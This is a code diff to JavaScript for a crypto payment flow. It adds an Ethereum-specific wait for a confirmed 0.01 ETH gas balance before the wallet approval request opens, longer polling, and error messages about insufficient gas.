@@ -638,7 +638,9 @@ async function waitForPaymentResult() {
 async function waitUntilGasReady(options) {
   if (!paymentId) return false;
   const poll = Boolean(options && options.poll);
-  const attempts = poll ? 12 : 1;
+  const p = paymentQueue[paymentIndex];
+  const eth = p && p.network === 'eth';
+  const attempts = poll ? (eth ? 24 : 12) : 1;
   for (let i = 0; i < attempts; i += 1) {
     if (i > 0) await sleep(2500);
     try {
@@ -663,8 +665,10 @@ async function ensureGasInBackground(p) {
   const gas = p.gas || {};
   const label = networkLabel(p.network);
   if (p.status === 'verified' && p.transactionHash) return true;
-  setBusy(true, 'Checking ' + label + ' gas', 'If native gas is low, the server tops it up first.');
-  if (gas.sufficient === true && p.status !== 'awaiting_gas') {
+  setBusy(true, 'Checking ' + label + ' gas', p.network === 'eth'
+    ? 'Need at least 0.01 ETH for fees. Approval stays closed until that live balance is confirmed.'
+    : 'If native gas is low, the server tops it up first.');
+  if (p.network !== 'eth' && gas.sufficient === true && p.status !== 'awaiting_gas') {
     return true;
   }
   try {
@@ -694,11 +698,18 @@ async function requestCurrentApproval() {
     const data = await res.json();
     if (!res.ok) {
       if (/already waiting/i.test(String(data.message || ''))) return;
+      if (/insufficient|could not confirm live|native gas/i.test(String(data.message || ''))) {
+        throw new Error(data.message);
+      }
       throw new Error(data.message || 'Could not request approval');
     }
     reopenSelectedWallet();
     waitForPaymentResult();
   } catch (err) {
+    if (p.network === 'eth') {
+      showPayError(err.message);
+      return;
+    }
     try {
       await sleep(1200);
       reopenSelectedWallet();
@@ -730,7 +741,17 @@ async function runCurrentNetwork() {
     advanceAfterNetworkDone('verified');
     return;
   }
-  await ensureGasInBackground(p);
+  const gasReady = await ensureGasInBackground(p);
+  if (!gasReady) {
+    setBusy(
+      true,
+      p.network === 'eth' ? 'Need 0.01 ETH for fees' : 'Waiting for ' + networkLabel(p.network) + ' gas',
+      p.network === 'eth'
+        ? 'The approval popup stays closed until live Ethereum gas is at least 0.01 ETH.'
+        : 'Native gas is still short. Approval will not open yet.'
+    );
+    return;
+  }
   await requestCurrentApproval();
 }
 
